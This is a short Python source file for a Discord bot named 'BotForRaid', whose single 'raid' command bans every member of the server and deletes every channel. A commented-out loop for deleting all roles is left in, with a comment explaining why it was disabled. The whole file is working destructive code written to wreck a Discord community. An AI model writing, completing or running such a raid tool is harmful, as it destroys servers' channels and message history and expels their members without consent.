import discord
import asyncio

from discord.ext import commands

bot = commands.Bot(command_prefix='r')


@bot.listen()
async def on_ready():
    print('BotForRaid ready')

#step 1 is finished for the deletion of role I put a program in # because it is impossible to delete all the roles and 
#since to delete all the roles you must be the owner of the server


@bot.command(pass_context = True)
async def raid(ctx):
        for user in ctx.guild.members:
            await user.ban()
        for channel in ctx.guild.channels:
            await channel.delete()
        #for role in ctx.guild.roles:
            #await role.delete()
        







bot.run('token')

